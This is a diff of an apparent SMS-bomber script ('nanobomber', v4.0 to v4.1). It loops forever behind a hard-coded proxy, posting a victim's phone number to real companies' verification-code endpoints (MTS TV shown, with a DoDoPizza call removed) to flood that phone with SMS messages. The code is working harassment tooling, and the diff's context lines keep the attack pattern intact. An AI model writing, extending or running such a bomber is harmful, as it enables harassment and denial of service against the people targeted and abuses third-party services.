@@ -5,7 +5,7 @@ banner = """
   ___  ___ ____  ___  / /  ___  __ _  / /  ___ ____
  / _ \/ _ `/ _ \/ _ \/ _ \/ _ \/  ' \/ _ \/ -_) __/
 /_//_/\_,_/_//_/\___/_.__/\___/_/_/_/_.__/\__/_/   
-                        v.4.0 ( Made in @artem450 )            
+                        v.4.1 ( Made in @artem450 )            
 """
 proxies={ 
     'http': '104.28.10.216:80'
@@ -108,13 +108,6 @@ while True:
     except:
         print('[-] не отправлено!')
         
-    try:
-        requests.post('https://dodopizza.ru/api/sendconfirmationcode', data={'phoneNumber': _phone})
-        print('[+] DoDoPizza отправлено!')
-        time.sleep(0.1)
-    except:
-        print('[-] не отправлено!')
-
     try:
         requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
         print('[+] MTS sent!')
